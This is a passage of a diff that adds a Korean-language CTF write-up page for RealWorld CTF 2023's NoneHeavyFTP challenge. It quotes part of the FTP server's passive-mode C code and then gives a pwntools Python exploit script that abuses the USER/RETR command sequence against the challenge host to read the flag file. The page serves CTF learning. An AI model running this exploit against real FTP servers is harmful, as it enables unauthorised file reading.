+</span></span><span style="display:flex;"><span>        context<span style="color:#f92672">-&gt;</span>DataSocket <span style="color:#f92672">=</span> clientsocket;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( clientsocket <span style="color:#f92672">==</span> INVALID_SOCKET )
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> INVALID_SOCKET;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        context<span style="color:#f92672">-&gt;</span>DataIPv4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        context<span style="color:#f92672">-&gt;</span>DataPort <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>        context<span style="color:#f92672">-&gt;</span>Mode <span style="color:#f92672">=</span> MODE_NORMAL;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> INVALID_SOCKET;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> clientsocket;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>PASSIVE MODE로 세팅해주고, 서버가 제공하는 포트에 접속해서 데이터를 받아주면 된다.</p>
+<h3 id="exploit-script">Exploit script<a hidden class="anchor" aria-hidden="true" href="#exploit-script">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sa <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x,y : p<span style="color:#f92672">.</span>sendafter(x,y)
+</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p<span style="color:#f92672">.</span>send(x)
+</span></span><span style="display:flex;"><span>rvu <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p<span style="color:#f92672">.</span>recvuntil(x)
+</span></span><span style="display:flex;"><span>local <span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> local<span style="color:#f92672">==</span><span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>    ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;127.0.0.1&#39;</span>
+</span></span><span style="display:flex;"><span>    mip <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;127,0,0,1&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span> :
+</span></span><span style="display:flex;"><span>    ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;47.89.253.219&#39;</span>
+</span></span><span style="display:flex;"><span>    mip <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0,0,0,0&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(ip,<span style="color:#ae81ff">2121</span>)
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>
+</span></span><span style="display:flex;"><span>pay <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;USER anonymous</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>sa(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;ready&#39;</span>,pay)
+</span></span><span style="display:flex;"><span>pay <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;PASS AAAAA</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>sa(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39; OK&#39;</span>,pay)
+</span></span><span style="display:flex;"><span>pay <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;PASV </span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>sa(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;logged in&#39;</span>,pay)
+</span></span><span style="display:flex;"><span>pay <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;MLSD /</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>sa(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Passive&#39;</span>,pay)
+</span></span><span style="display:flex;"><span>rvu(mip<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;,&#39;</span>)
+</span></span><span style="display:flex;"><span>recv <span style="color:#f92672">=</span> rvu(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;)&#39;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;,&#39;</span>)
+</span></span><span style="display:flex;"><span>recv <span style="color:#f92672">=</span> [int(x) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> recv]
+</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> recv[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">256</span> <span style="color:#f92672">+</span> recv[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;nc </span><span style="color:#e6db74">{</span>ip<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>s(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;USER /</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;flag name : &#34;</span>,end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
+</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> input()
+</span></span><span style="display:flex;"><span>s(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;USER anonymous</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>sa(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39; OK&#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;PASS AAAAA</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>sa(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;logged in&#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;PASV </span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>rvu(mip<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;,&#39;</span>)
+</span></span><span style="display:flex;"><span>recv <span style="color:#f92672">=</span> rvu(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;)&#39;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;,&#39;</span>)
+</span></span><span style="display:flex;"><span>recv <span style="color:#f92672">=</span> [int(x) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> recv]
+</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> recv[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">256</span> <span style="color:#f92672">+</span> recv[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;nc </span><span style="color:#e6db74">{</span>ip<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">+</span>flag
+</span></span><span style="display:flex;"><span>pay <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;RETR /hello.txt</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>
+</span></span><span style="display:flex;"><span>s(pay)
+</span></span><span style="display:flex;"><span>s(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;USER </span><span style="color:#e6db74">{</span>flag[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#e6db74">}</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p><img loading="lazy" src="/blog/RealWorld_CTF_2023_NoneHeavyFTP/image1.png" alt=""  />
+<br>
+nc로 직접 접속해줘야된다.<br>
+<img loading="lazy" src="/blog/RealWorld_CTF_2023_NoneHeavyFTP/image-1.png" alt=""  />
+<br>
+<img loading="lazy" src="/blog/RealWorld_CTF_2023_NoneHeavyFTP/image5.png" alt=""  />
+<br>
+flag 이름 넣어주고 다른 포트로 다시 접속하면 된다.<br>
+<img loading="lazy" src="/blog/RealWorld_CTF_2023_NoneHeavyFTP/image-1-1.png" alt=""  />
+</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="https://msh1307.kr/tags/realworld-ctf-2023/">RealWorld CTF 2023</a></li>
+      <li><a href="https://msh1307.kr/tags/realworld-ctf-noneheavyftp/">RealWorld CTF NoneheavyFTP</a></li>
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2024 <a href="https://msh1307.kr">msh1307</a></span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
